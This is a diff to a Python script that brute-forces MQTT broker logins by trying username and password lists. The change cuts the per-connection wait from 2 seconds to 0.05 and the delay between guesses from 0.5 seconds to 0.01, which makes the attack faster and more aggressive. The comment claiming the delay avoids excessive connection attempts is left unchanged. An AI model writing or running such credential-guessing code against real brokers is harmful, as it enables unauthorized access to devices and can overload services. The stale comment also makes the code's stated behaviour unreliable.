@@ -38,7 +38,7 @@ def attempt_mqtt_connection(broker, port, username, password):
     try:
         client.connect(broker, port, 5)  # 5-second timeout
         client.loop_start()  # Start network loop
-        time.sleep(2)  # Allow time for connection to process
+        time.sleep(0.05)  # Allow time for connection to process
         client.loop_stop()  # Stop the loop
         return client._userdata["authenticated"]
     except Exception:
@@ -63,7 +63,7 @@ def brute_force_mqtt(broker, port, username, userlist, passlist):
             if attempt_mqtt_connection(broker, port, username, password):
                 print("[!] Valid credentials found, stopping attack.")
                 return
-            time.sleep(0.5)  # Delay to avoid excessive connection attempts
+            time.sleep(0.01)  # Delay to avoid excessive connection attempts
 
 # Command-line argument parsing
 if __name__ == "__main__":
